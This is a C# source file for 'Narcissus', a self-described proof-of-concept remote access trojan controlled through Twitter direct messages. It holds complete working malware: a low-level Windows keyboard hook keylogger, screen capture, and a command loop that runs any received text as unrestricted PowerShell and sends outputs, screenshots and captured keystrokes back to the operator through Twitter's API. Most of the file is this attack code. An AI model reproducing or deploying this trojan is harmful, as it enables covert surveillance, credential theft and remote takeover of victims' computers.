/*
 * AUTHOR: 2d Lt Braden Laverick
 * ORGANIZATION: 92 COS/DOA
 * PROJECT: Narcissus
 * DESCRIPTION: This project is a proof of concept for a twitter-based remote access trojan. The tool is controlled through
 * direct messages in twitter. The bot requires access to one account to receive and send direct messages.
 */

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Http;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using System.Windows.Forms;

namespace narcissus
{

    public class Target
    {
        public string recipient_id { get; set; }
    }


    public class Entities
    {
        public List<object> hashtags { get; set; }
        public List<object> symbols { get; set; }
        public List<object> user_mentions { get; set; }
        public List<object> urls { get; set; }
    }


    public class MessageData
    {
        public string text { get; set; }
        public Entities entities { get; set; }
    }


    public class MessageCreate
    {
        public Target target { get; set; }
        public string sender_id { get; set; }
        public string source_app_id { get; set; }
        public MessageData message_data { get; set; }
    }


    public class Event
    {
        public string type { get; set; }
        public string id { get; set; }
        public string created_timestamp { get; set; }
        public MessageCreate message_create { get; set; }
    }


    public class __invalid_type__16162985
    {
        public string id { get; set; }
        public string name { get; set; }
        public string url { get; set; }
    }


    public class Apps
    {
        public __invalid_type__16162985 __invalid_name__16162985 { get; set; }
    }


    public class TwitterResponse
    {
        public List<Event> events { get; set; }
        public Apps apps { get; set; }
    }



    public class UploadResponse
    {
        public long media_id { get; set; }
        public string media_id_string { get; set; }
        public int expires_after_secs { get; set; }
    }

    public class LlKeyLogger
    {
        /// <summary>
        /// Virtual Keys
        /// </summary>
        public enum VKeys
        {
            // Losely based on http://www.pinvoke.net/default.aspx/Enums/VK.html

            LBUTTON = 0x01,     // Left mouse button
            RBUTTON = 0x02,     // Right mouse button
            CANCEL = 0x03,      // Control-break processing
            MBUTTON = 0x04,     // Middle mouse button (three-button mouse)
            XBUTTON1 = 0x05,    // Windows 2000/XP: X1 mouse button
            XBUTTON2 = 0x06,    // Windows 2000/XP: X2 mouse button
            //                  0x07   // Undefined
            BACK = 0x08,        // BACKSPACE key
            TAB = 0x09,         // TAB key
            //                  0x0A-0x0B,  // Reserved
            CLEAR = 0x0C,       // CLEAR key
            RETURN = 0x0D,      // ENTER key
            //                  0x0E-0x0F, // Undefined
            SHIFT = 0x10,       // SHIFT key
            CONTROL = 0x11,     // CTRL key
            MENU = 0x12,        // ALT key
            PAUSE = 0x13,       // PAUSE key
            CAPITAL = 0x14,     // CAPS LOCK key
            KANA = 0x15,        // Input Method Editor (IME) Kana mode
            HANGUL = 0x15,      // IME Hangul mode
            //                  0x16,  // Undefined
            JUNJA = 0x17,       // IME Junja mode
            FINAL = 0x18,       // IME final mode
            HANJA = 0x19,       // IME Hanja mode
            KANJI = 0x19,       // IME Kanji mode
            //                  0x1A,  // Undefined
            ESCAPE = 0x1B,      // ESC key
            CONVERT = 0x1C,     // IME convert
            NONCONVERT = 0x1D,  // IME nonconvert
            ACCEPT = 0x1E,      // IME accept
            MODECHANGE = 0x1F,  // IME mode change request
            SPACE = 0x20,       // SPACEBAR
            PRIOR = 0x21,       // PAGE UP key
            NEXT = 0x22,        // PAGE DOWN key
            END = 0x23,         // END key
            HOME = 0x24,        // HOME key
            LEFT = 0x25,        // LEFT ARROW key
            UP = 0x26,          // UP ARROW key
            RIGHT = 0x27,       // RIGHT ARROW key
            DOWN = 0x28,        // DOWN ARROW key
            SELECT = 0x29,      // SELECT key
            PRINT = 0x2A,       // PRINT key
            EXECUTE = 0x2B,     // EXECUTE key
            SNAPSHOT = 0x2C,    // PRINT SCREEN key
            INSERT = 0x2D,      // INS key
            DELETE = 0x2E,      // DEL key
            HELP = 0x2F,        // HELP key
            d0 = 0x30,       // 0 key
            d1 = 0x31,       // 1 key
            d2 = 0x32,       // 2 key
            d3 = 0x33,       // 3 key
            d4 = 0x34,       // 4 key
            d5 = 0x35,       // 5 key
            d6 = 0x36,       // 6 key
            d7 = 0x37,       // 7 key
            d8 = 0x38,       // 8 key
            d9 = 0x39,       // 9 key
            //                  0x3A-0x40, // Undefined
            A = 0x41,       // A key
            B = 0x42,       // B key
            C = 0x43,       // C key
            D = 0x44,       // D key
            E = 0x45,       // E key
            F = 0x46,       // F key
            G = 0x47,       // G key
            H = 0x48,       // H key
            I = 0x49,       // I key
            J = 0x4A,       // J key
            K = 0x4B,       // K key
            L = 0x4C,       // L key
            M = 0x4D,       // M key
            N = 0x4E,       // N key
            O = 0x4F,       // O key
            P = 0x50,       // P key
            Q = 0x51,       // Q key
            R = 0x52,       // R key
            S = 0x53,       // S key
            T = 0x54,       // T key
            U = 0x55,       // U key
            V = 0x56,       // V key
            W = 0x57,       // W key
            X = 0x58,       // X key
            Y = 0x59,       // Y key
            Z = 0x5A,       // Z key
            LWIN = 0x5B,        // Left Windows key (Microsoft Natural keyboard)
            RWIN = 0x5C,        // Right Windows key (Natural keyboard)
            APPS = 0x5D,        // Applications key (Natural keyboard)
            //                  0x5E, // Reserved
            SLEEP = 0x5F,       // Computer Sleep key
            NUMPAD0 = 0x60,     // Numeric keypad 0 key
            NUMPAD1 = 0x61,     // Numeric keypad 1 key
            NUMPAD2 = 0x62,     // Numeric keypad 2 key
            NUMPAD3 = 0x63,     // Numeric keypad 3 key
            NUMPAD4 = 0x64,     // Numeric keypad 4 key
            NUMPAD5 = 0x65,     // Numeric keypad 5 key
            NUMPAD6 = 0x66,     // Numeric keypad 6 key
            NUMPAD7 = 0x67,     // Numeric keypad 7 key
            NUMPAD8 = 0x68,     // Numeric keypad 8 key
            NUMPAD9 = 0x69,     // Numeric keypad 9 key
            MULTIPLY = 0x6A,    // Multiply key
            ADD = 0x6B,         // Add key
            SEPARATOR = 0x6C,   // Separator key
            SUBTRACT = 0x6D,    // Subtract key
            DECIMAL = 0x6E,     // Decimal key
            DIVIDE = 0x6F,      // Divide key
            F1 = 0x70,          // F1 key
            F2 = 0x71,          // F2 key
            F3 = 0x72,          // F3 key
            F4 = 0x73,          // F4 key
            F5 = 0x74,          // F5 key
            F6 = 0x75,          // F6 key
            F7 = 0x76,          // F7 key
            F8 = 0x77,          // F8 key
            F9 = 0x78,          // F9 key
            F10 = 0x79,         // F10 key
            F11 = 0x7A,         // F11 key
            F12 = 0x7B,         // F12 key
            F13 = 0x7C,         // F13 key
            F14 = 0x7D,         // F14 key
            F15 = 0x7E,         // F15 key
            F16 = 0x7F,         // F16 key
            F17 = 0x80,         // F17 key  
            F18 = 0x81,         // F18 key  
            F19 = 0x82,         // F19 key  
            F20 = 0x83,         // F20 key  
            F21 = 0x84,         // F21 key  
            F22 = 0x85,         // F22 key, (PPC only) Key used to lock device.
            F23 = 0x86,         // F23 key  
            F24 = 0x87,         // F24 key  
            //                  0x88-0X8F,  // Unassigned
            NUMLOCK = 0x90,     // NUM LOCK key
            SCROLL = 0x91,      // SCROLL LOCK key
            //                  0x92-0x96,  // OEM specific
            //                  0x97-0x9F,  // Unassigned
            LSHIFT = 0xA0,      // Left SHIFT key
            RSHIFT = 0xA1,      // Right SHIFT key
            LCONTROL = 0xA2,    // Left CONTROL key
            RCONTROL = 0xA3,    // Right CONTROL key
            LMENU = 0xA4,       // Left MENU key
            RMENU = 0xA5,       // Right MENU key
            BROWSER_BACK = 0xA6,    // Windows 2000/XP: Browser Back key
            BROWSER_FORWARD = 0xA7, // Windows 2000/XP: Browser Forward key
            BROWSER_REFRESH = 0xA8, // Windows 2000/XP: Browser Refresh key
            BROWSER_STOP = 0xA9,    // Windows 2000/XP: Browser Stop key
            BROWSER_SEARCH = 0xAA,  // Windows 2000/XP: Browser Search key
            BROWSER_FAVORITES = 0xAB,  // Windows 2000/XP: Browser Favorites key
            BROWSER_HOME = 0xAC,    // Windows 2000/XP: Browser Start and Home key
            VOLUME_MUTE = 0xAD,     // Windows 2000/XP: Volume Mute key
            VOLUME_DOWN = 0xAE,     // Windows 2000/XP: Volume Down key
            VOLUME_UP = 0xAF,  // Windows 2000/XP: Volume Up key
            MEDIA_NEXT_TRACK = 0xB0,// Windows 2000/XP: Next Track key
            MEDIA_PREV_TRACK = 0xB1,// Windows 2000/XP: Previous Track key
            MEDIA_STOP = 0xB2, // Windows 2000/XP: Stop Media key
            MEDIA_PLAY_PAUSE = 0xB3,// Windows 2000/XP: Play/Pause Media key
            LAUNCH_MAIL = 0xB4,     // Windows 2000/XP: Start Mail key
            LAUNCH_MEDIA_SELECT = 0xB5,  // Windows 2000/XP: Select Media key
            LAUNCH_APP1 = 0xB6,     // Windows 2000/XP: Start Application 1 key
            LAUNCH_APP2 = 0xB7,     // Windows 2000/XP: Start Application 2 key
            //                  0xB8-0xB9,  // Reserved
            OEM_1 = 0xBA,       // Used for miscellaneous characters; it can vary by keyboard.
            // Windows 2000/XP: For the US standard keyboard, the ';:' key
            OEM_PLUS = 0xBB,    // Windows 2000/XP: For any country/region, the '+' key
            OEM_COMMA = 0xBC,   // Windows 2000/XP: For any country/region, the ',' key
            OEM_MINUS = 0xBD,   // Windows 2000/XP: For any country/region, the '-' key
            OEM_PERIOD = 0xBE,  // Windows 2000/XP: For any country/region, the '.' key
            OEM_2 = 0xBF,       // Used for miscellaneous characters; it can vary by keyboard.
            // Windows 2000/XP: For the US standard keyboard, the '/?' key
            OEM_3 = 0xC0,       // Used for miscellaneous characters; it can vary by keyboard.
            // Windows 2000/XP: For the US standard keyboard, the '`~' key
            //                  0xC1-0xD7,  // Reserved
            //                  0xD8-0xDA,  // Unassigned
            OEM_4 = 0xDB,       // Used for miscellaneous characters; it can vary by keyboard.
            // Windows 2000/XP: For the US standard keyboard, the '[{' key
            OEM_5 = 0xDC,       // Used for miscellaneous characters; it can vary by keyboard.
            // Windows 2000/XP: For the US standard keyboard, the '\|' key
            OEM_6 = 0xDD,       // Used for miscellaneous characters; it can vary by keyboard.
            // Windows 2000/XP: For the US standard keyboard, the ']}' key
            OEM_7 = 0xDE,       // Used for miscellaneous characters; it can vary by keyboard.
            // Windows 2000/XP: For the US standard keyboard, the 'single-quote/double-quote' key
            OEM_8 = 0xDF,       // Used for miscellaneous characters; it can vary by keyboard.
            //                  0xE0,  // Reserved
            //                  0xE1,  // OEM specific
            OEM_102 = 0xE2,     // Windows 2000/XP: Either the angle bracket key or the backslash key on the RT 102-key keyboard
            //                  0xE3-E4,  // OEM specific
            PROCESSKEY = 0xE5,  // Windows 95/98/Me, Windows NT 4.0, Windows 2000/XP: IME PROCESS key
            //                  0xE6,  // OEM specific
            PACKET = 0xE7,      // Windows 2000/XP: Used to pass Unicode characters as if they were keystrokes. The VK_PACKET key is the low word of a 32-bit Virtual Key value used for non-keyboard input methods. For more information, see Remark in KEYBDINPUT, SendInput, WM_KEYDOWN, and WM_KEYUP
            //                  0xE8,  // Unassigned
            //                  0xE9-F5,  // OEM specific
            ATTN = 0xF6,        // Attn key
            CRSEL = 0xF7,       // CrSel key
            EXSEL = 0xF8,       // ExSel key
            EREOF = 0xF9,       // Erase EOF key
            PLAY = 0xFA,        // Play key
            ZOOM = 0xFB,        // Zoom key
            NONAME = 0xFC,      // Reserved
            PA1 = 0xFD,         // PA1 key
            OEM_CLEAR = 0xFE    // Clear key
        }

        /// <summary>
        /// Internal callback processing function
        /// </summary>
        private delegate IntPtr KeyboardHookHandler(int nCode, IntPtr wParam, IntPtr lParam);
        private KeyboardHookHandler hookHandler;

        /// <summary>
        /// Function that will be called when defined events occur
        /// </summary>
        /// <param name="key">VKeys</param>
        public delegate void KeyboardHookCallback(VKeys key);

        #region Events
        public event KeyboardHookCallback KeyDown;
        public event KeyboardHookCallback KeyUp;
        #endregion

        /// <summary>
        /// Hook ID
        /// </summary>
        private IntPtr hookID = IntPtr.Zero;

        /// <summary>
        /// Install low level keyboard hook
        /// </summary>
        public void Install()
        {
            hookHandler = HookFunc;
            hookID = SetHook(hookHandler);
        }

        /// <summary>
        /// Remove low level keyboard hook
        /// </summary>
        public void Uninstall()
        {
            UnhookWindowsHookEx(hookID);
        }

        /// <summary>
        /// Registers hook with Windows API
        /// </summary>
        /// <param name="proc">Callback function</param>
        /// <returns>Hook ID</returns>
        private IntPtr SetHook(KeyboardHookHandler proc)
        {
            using (ProcessModule module = Process.GetCurrentProcess().MainModule)
                return SetWindowsHookEx(13, proc, GetModuleHandle(module.ModuleName), 0);
        }

        /// <summary>
        /// Default hook call, which analyses pressed keys
        /// </summary>
        private IntPtr HookFunc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int iwParam = wParam.ToInt32();

                if ((iwParam == WM_KEYDOWN || iwParam == WM_SYSKEYDOWN))
                    if (KeyDown != null)
                        KeyDown((VKeys)Marshal.ReadInt32(lParam));
                if ((iwParam == WM_KEYUP || iwParam == WM_SYSKEYUP))
                    if (KeyUp != null)
                        KeyUp((VKeys)Marshal.ReadInt32(lParam));
            }

            return CallNextHookEx(hookID, nCode, wParam, lParam);
        }

        /// <summary>
        /// Destructor. Unhook current hook
        /// </summary>
        ~LlKeyLogger()
        {
            Uninstall();
        }

        /// <summary>
        /// Low-Level function declarations
        /// </summary>
        #region WinAPI
        private const int WM_KEYDOWN = 0x100;
        private const int WM_SYSKEYDOWN = 0x104;
        private const int WM_KEYUP = 0x101;
        private const int WM_SYSKEYUP = 0x105;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, KeyboardHookHandler lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        #endregion
    }

    public class Narcissus
    {
        static Narcissus narcissusMain = new Narcissus();
        static HttpClient narcissusDMClient = new HttpClient();
        static HttpClient narcissusImageClient = new HttpClient();
        static readonly string apiVar = Environment.GetEnvironmentVariable("narcissusKeys", EnvironmentVariableTarget.User);
        static readonly string[] apiKeys = apiVar.Split(';');
        static readonly string oauthKey = apiKeys[0];
        static readonly string oauthToken = apiKeys[2];
        static readonly string oauthKeySecret = apiKeys[1];
        static readonly string oauthTokenSecret = apiKeys[3];


        public async Task<string> GetAsync(HttpClient requestClient, string url)
        {
            using (var response = await requestClient.GetAsync(url))
            {
                return await response.Content.ReadAsStringAsync();
            }
        }


        public async Task<string> PostAsync(HttpClient requestClient, string url, HttpContent content)
        {
            using (var response = await requestClient.PostAsync(url, content))
            {
                return await response.Content.ReadAsStringAsync();
            }
        }


        public string Build_AuthHeader(string nonce, string timestamp, string method, string url, Dictionary<string, string> requestParams = null)
        {
            Dictionary<string, string> authorizationParams = new Dictionary<string, string>();
            authorizationParams.Add("oauth_nonce", nonce);
            authorizationParams.Add("oauth_timestamp", timestamp);
            authorizationParams.Add("oauth_consumer_key", oauthKey);
            authorizationParams.Add("oauth_signature_method", "HMAC-SHA1");
            authorizationParams.Add("oauth_token", oauthToken);
            authorizationParams.Add("oauth_version", "1.0");

            Dictionary<string, string> signatureParams = new Dictionary<string, string>(authorizationParams);
            if (requestParams != null)
            {
                foreach (KeyValuePair<string, string> paramPair in requestParams)
                {
                    signatureParams.Add(paramPair.Key, paramPair.Value);
                }
            }

            string signatureBaseString = "";
            List<string> paramKeys = signatureParams.Keys.ToList();
            paramKeys.Sort();
            foreach (string requestParam in paramKeys)
            {
                if (requestParam == paramKeys.First())
                {
                    signatureBaseString = signatureBaseString +
                        Uri.EscapeDataString(requestParam) +
                        "=" +
                        Uri.EscapeDataString(signatureParams[requestParam]);
                } else
                {
                    signatureBaseString = signatureBaseString +
                        "&" +
                        Uri.EscapeDataString(requestParam) +
                        "=" +
                        Uri.EscapeDataString(signatureParams[requestParam]);
                }
            }

            string signatureString = String.Format("{0}&{1}&{2}",
                method,
                Uri.EscapeDataString(url),
                Uri.EscapeDataString(signatureBaseString));

            byte[] signingKey = Encoding.UTF8.GetBytes(Uri.EscapeDataString(oauthKeySecret) +
                "&" +
                Uri.EscapeDataString(oauthTokenSecret));

            HMACSHA1 oauthSigner = new HMACSHA1(signingKey);
            byte[] oauthHashBytes = oauthSigner.ComputeHash(Encoding.UTF8.GetBytes(signatureString));
            string oauthSignature = Convert.ToBase64String(oauthHashBytes);

            authorizationParams.Add("oauth_signature", oauthSignature);

            string headerString = "";
            List<string> headerKeys = authorizationParams.Keys.ToList();
            headerKeys.Sort();
            foreach (string headerParam in headerKeys)
            {
                if (headerParam == headerKeys.Last())
                {
                    headerString = headerString +
                    Uri.EscapeDataString(headerParam) +
                    "=" +
                    "\"" +
                    Uri.EscapeDataString(authorizationParams[headerParam]) +
                    "\"";
                } else
                {
                    headerString = headerString +
                    Uri.EscapeDataString(headerParam) +
                    "=" +
                    "\"" +
                    Uri.EscapeDataString(authorizationParams[headerParam]) +
                    "\", ";
                }
            }

            return headerString;
        }


        public string Receive_DM()
        {
            string method = "GET";
            string dmReceiveUrl = "1.1/direct_messages/events/list.json";

            string nonce = Convert.ToBase64String(Encoding.UTF8.GetBytes(Guid.NewGuid().ToString("N")));
            UInt32 timestamp = (UInt32)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds;
            string formTimestamp = timestamp.ToString();
            string authenticationHeader = Build_AuthHeader(nonce, formTimestamp, method, narcissusDMClient.BaseAddress.ToString() + dmReceiveUrl);

            narcissusDMClient.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("OAuth", authenticationHeader);
            string twitterResponse = narcissusMain.GetAsync(narcissusDMClient, dmReceiveUrl).Result;

            return twitterResponse;
        }


        public string Send_DM(string recipientId, string message, string mediaType = null, string mediaID = null)
        {
            string method = "POST";
            string dmSendUrl = "1.1/direct_messages/events/new.json";
            Dictionary<string, string> sendDMParams = new Dictionary<string, string>();
            sendDMParams.Add("type", "message_create");
            sendDMParams.Add("message_create.target.recipient_id", recipientId);
            sendDMParams.Add("message_create.message_data", message);

            string nonce = Convert.ToBase64String(Encoding.UTF8.GetBytes(Guid.NewGuid().ToString("N")));
            UInt32 timestamp = (UInt32)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds;
            string formTimestamp = timestamp.ToString();
            string authenticationHeader = Build_AuthHeader(nonce, formTimestamp, method, narcissusDMClient.BaseAddress.ToString() + dmSendUrl);

            string postData = "{\"event\": " +
                "{" +
                "\"type\": \"message_create\", " +
                "\"message_create\": {" +
                    "\"target\": {\"recipient_id\": " + "\"" + sendDMParams["message_create.target.recipient_id"] + "\"" + "}," +
                    "\"message_data\": {\"text\": " + "\"" + sendDMParams["message_create.message_data"] + "\"";

            if (mediaType != null && mediaID != null)
            {
                postData = postData + ", \"attachment\": {\"type\": \"" + mediaType + "\", \"media\": {\"id\": \"" + mediaID + "\" }}";
            }

            postData = postData + "}}}}";

            HttpContent messageContent = new StringContent(postData);

            narcissusDMClient.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("OAuth", authenticationHeader);
            narcissusDMClient.DefaultRequestHeaders.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue("application/json"));

            string twitterResponse = narcissusMain.PostAsync(narcissusDMClient, dmSendUrl, messageContent).Result;

            return twitterResponse;
        }

        public void GetScreenshot(string targetPath)
        {
            Bitmap screenBmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            using (Graphics g = Graphics.FromImage(screenBmp))
            {
                g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                screenBmp.Save(targetPath);
            }
        }

        public string InitImageUpload(string imageLocation, long imageSize)
        {
            string method = "POST";
            string initUploadUrl = "1.1/media/upload.json";

            Dictionary<string, string> initUploadParams = new Dictionary<string, string>();
            initUploadParams.Add("command", "INIT");
            initUploadParams.Add("total_bytes", imageSize.ToString());
            initUploadParams.Add("media_type", "image/png");
            initUploadParams.Add("media_category", "dm_image");

            string nonce = Convert.ToBase64String(Encoding.UTF8.GetBytes(Guid.NewGuid().ToString("N")));
            UInt32 timestamp = (UInt32)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds;
            string formTimestamp = timestamp.ToString();
            string authenticationHeader = Build_AuthHeader(nonce, formTimestamp, method, narcissusImageClient.BaseAddress.ToString() + initUploadUrl, initUploadParams);

            narcissusImageClient.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("OAuth", authenticationHeader);

            FormUrlEncodedContent initParamsFormatted = new FormUrlEncodedContent(initUploadParams);

            Task<string> initPost = narcissusMain.PostAsync(narcissusImageClient, initUploadUrl, initParamsFormatted);
            initPost.Wait();
            string twitterResponse = initPost.Result;


            return twitterResponse;
        }


        public void AppendImageData(byte[] imageContent, string mediaId)
        {
            string method = "POST";
            string uploadUrl = "1.1/media/upload.json";

            string nonce = Convert.ToBase64String(Encoding.UTF8.GetBytes(Guid.NewGuid().ToString("N")));
            UInt32 timestamp = (UInt32)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds;
            string formTimestamp = timestamp.ToString();
            string authenticationHeader = Build_AuthHeader(nonce, formTimestamp, method, narcissusImageClient.BaseAddress.ToString() + uploadUrl);

            narcissusImageClient.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("OAuth", authenticationHeader);

            int chunkSize = 32766;
            int nChunks = imageContent.Length / chunkSize;
            int leftoverData = imageContent.Length % chunkSize;
            int lastIndex = 0;

            for (int i = 0; i < nChunks; i++)
            {
                using (MultipartFormDataContent appendForm = new MultipartFormDataContent())
                {
                    appendForm.Add(new StringContent("APPEND"), "\"command\"");
                    appendForm.Add(new StringContent(mediaId), "\"media_id\"");
                    appendForm.Add(new ByteArrayContent(imageContent, i * chunkSize, chunkSize), "\"media\"");
                    appendForm.Add(new StringContent(i.ToString()), "\"segment_index\"");
                    Task<string> appendPost = narcissusMain.PostAsync(narcissusImageClient, uploadUrl, appendForm);
                    appendPost.Wait(); ;
                    lastIndex = i;
                }
            }
            if (leftoverData != 0)
            {
                using (MultipartFormDataContent appendForm = new MultipartFormDataContent())
                {
                    appendForm.Add(new StringContent("APPEND"), "\"command\"");
                    appendForm.Add(new StringContent(mediaId), "\"media_id\"");
                    appendForm.Add(new ByteArrayContent(imageContent, (lastIndex + 1) * chunkSize, leftoverData), "\"media\"");
                    appendForm.Add(new StringContent((lastIndex + 1).ToString()), "\"segment_index\"");
                    Task<string> appendPost = narcissusMain.PostAsync(narcissusImageClient, uploadUrl, appendForm);
                    appendPost.Wait();
                }
            }
        }


        public string FinalizeImageUpload(string mediaId)
        {
            string method = "POST";
            string uploadUrl = "1.1/media/upload.json";

            Dictionary<string, string> finalizeParams = new Dictionary<string, string>();
            finalizeParams.Add("command", "FINALIZE");
            finalizeParams.Add("media_id", mediaId);

            string nonce = Convert.ToBase64String(Encoding.UTF8.GetBytes(Guid.NewGuid().ToString("N")));
            UInt32 timestamp = (UInt32)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds;
            string formTimestamp = timestamp.ToString();
            string authenticationHeader = Build_AuthHeader(nonce, formTimestamp, method, narcissusImageClient.BaseAddress.ToString() + uploadUrl, finalizeParams);

            narcissusImageClient.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("OAuth", authenticationHeader);

            FormUrlEncodedContent finalizeParamsFormatted = new FormUrlEncodedContent(finalizeParams);

            Task<string> finalizePost = narcissusMain.PostAsync(narcissusImageClient, uploadUrl, finalizeParamsFormatted);
            finalizePost.Wait();
            string twitterResponse = finalizePost.Result;

            return twitterResponse;
        }


        public string UploadImage(string imagePath)
        {
            byte[] imageContent = File.ReadAllBytes(imagePath);
            JavaScriptSerializer responseParser = new JavaScriptSerializer();
            string twitterResponse = narcissusMain.InitImageUpload(imagePath, imageContent.LongLength);
            UploadResponse responseData = responseParser.Deserialize<UploadResponse>(twitterResponse);

            narcissusMain.AppendImageData(imageContent, responseData.media_id_string);

            string finalizeResponse = narcissusMain.FinalizeImageUpload(responseData.media_id_string);

            return responseData.media_id_string;
        }

        

        public string RunPowerShell(Runspace rs, string script)
        {
            Pipeline nPipeline = rs.CreatePipeline();
            nPipeline.Commands.AddScript(script);
            nPipeline.Commands.Add("Out-String");
            string shellOut = "";
            try
            {
                //error handle system errors and null returns
                foreach (PSObject shellResult in nPipeline.Invoke())
                {
                    if (shellResult == null)
                    {
                        shellOut = shellOut += "The command supplied returned null";
                    }
                    else
                    {
                        shellOut = shellOut + Regex.Replace(shellResult.ToString(), @"\t|\n|\r", "") + " ";
                    }
                }
                nPipeline.Commands.Clear();
            }
            catch (PSInvalidOperationException)
            {
                shellOut = "An invalid PowerShell command was given";
            }
            nPipeline.Stop();
            return shellOut;
        }


        public static void RunKeylogger()
        {
            LlKeyLogger keyboardHook = new LlKeyLogger();
            keyboardHook.KeyDown += new LlKeyLogger.KeyboardHookCallback(KeyboardHook_KeyDown);
            keyboardHook.Install();
            try
            {
                Application.Run();
            }
            catch (ThreadAbortException)
            {
                keyboardHook.KeyDown -= new LlKeyLogger.KeyboardHookCallback(KeyboardHook_KeyDown);
                keyboardHook.Uninstall();
                Console.WriteLine("Keylogger uninstalled. Exiting... ");
            }
        }

        private static void KeyboardHook_KeyDown(LlKeyLogger.VKeys key)
        {
            string printKey = key.ToString();
            if(printKey == "SPACE")
            {
                printKey = " ";
            } else if (printKey == "RETURN")
            {
                printKey = "\n";
            }
            File.AppendAllText(Path.GetTempPath() + "key.log",  printKey);
        }

        public static void MessageListener()
        {
            string twitterResponse;
            JavaScriptSerializer messageParser = new JavaScriptSerializer();
            TwitterResponse responseData;
            DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Utc);
            DateTime latestTime = DateTime.Now.ToUniversalTime();

            int beaconTimer = 60;

            Thread keyThread = new Thread(new ThreadStart(RunKeylogger));

            RunspaceConfiguration nRsConfig = RunspaceConfiguration.Create();
            Runspace narcissusRs = RunspaceFactory.CreateRunspace(nRsConfig);
            narcissusRs.Open();
            RunspaceInvoke nRsInvoker = new RunspaceInvoke(narcissusRs);
            nRsInvoker.Invoke("Set-ExecutionPolicy -Scope Process Unrestricted");

            while (true)
            {
                try
                {
                    twitterResponse = narcissusMain.Receive_DM();
                    responseData = messageParser.Deserialize<TwitterResponse>(twitterResponse);
                    foreach (Event dmEvent in responseData.events)
                    {
                        if (epoch.AddMilliseconds(Convert.ToDouble(dmEvent.created_timestamp)) > latestTime && dmEvent.message_create.sender_id != "35088627")
                        {
                            // Reset latest time
                            latestTime = epoch.AddMilliseconds(Convert.ToDouble(dmEvent.created_timestamp));
                            Console.WriteLine(latestTime.ToString());
                            Console.WriteLine(dmEvent.message_create.message_data.text);

                            // Narcissus custom commands
                            if (dmEvent.message_create.message_data.text == "Kill")
                            {
                                narcissusMain.Send_DM(dmEvent.message_create.sender_id, "Acknowledged. Killing narcissus agent.");
                                return;
                            }
                            else if (dmEvent.message_create.message_data.text.Split(' ')[0] == "Set-Beacon")
                            {
                                beaconTimer = Convert.ToInt32(dmEvent.message_create.message_data.text.Split(' ')[1]);
                                narcissusMain.Send_DM(dmEvent.message_create.sender_id, "Acknowledged. Setting beacon to " + beaconTimer.ToString() + " seconds.");
                            }
                            else if (dmEvent.message_create.message_data.text == "Get-Screenshot")
                            {
                                string targetPath = Path.GetTempPath() + "mssccm.png";
                                narcissusMain.GetScreenshot(targetPath);
                                string screenshotId = narcissusMain.UploadImage(targetPath);
                                narcissusMain.Send_DM(dmEvent.message_create.sender_id, "Got screenshot.", "media", screenshotId);
                                File.Delete(targetPath);
                            }
                            else if (dmEvent.message_create.message_data.text == "Start-Keylogger")
                            {
                                narcissusMain.Send_DM(dmEvent.message_create.sender_id, "Acknowledged. Starting keylogger.");
                                if (!keyThread.IsAlive)
                                { 
                                    keyThread.Start();
                                }
                            }
                            else if (dmEvent.message_create.message_data.text == "Kill-Keylogger")
                            {
                                if (keyThread.IsAlive)
                                {
                                    keyThread.Abort();
                                }
                                string loggedKeys = File.ReadAllText(Path.GetTempPath() + "key.log");
                                narcissusMain.Send_DM(dmEvent.message_create.sender_id, loggedKeys);
                                File.Delete(Path.GetTempPath() + "key.log");                             
                            }
                            else
                            {
                                // Run custom PowerShell command                              
                                string output = narcissusMain.RunPowerShell(narcissusRs, dmEvent.message_create.message_data.text);
                                narcissusMain.Send_DM(dmEvent.message_create.sender_id, output);
                            }
                        }
                    }
                    Thread.Sleep(beaconTimer * 1000);
                }
                catch (ThreadAbortException)
                {
                    narcissusRs.Close();
                    Console.WriteLine("Narcissus listener exited safely");
                    return;
                }
            } 
        }
        

        public static void Main()
        {
            /*
            narcissusDMClient.BaseAddress = new Uri("https://api.twitter.com/");
            narcissusImageClient.BaseAddress = new Uri("https://upload.twitter.com/");
            Thread listenerThread = new Thread(new ThreadStart(MessageListener));
            listenerThread.Start();
            listenerThread.Join();
            */
            Thread keyloggerTest = new Thread(new ThreadStart(RunKeylogger));
            keyloggerTest.Start();
            Console.WriteLine("Press [q] to quit >> ");
            while(Console.ReadLine() != "q")
            {
                Console.WriteLine("Press [q] to quit >> ");
            }
            keyloggerTest.Abort();
        }

        
    }
}
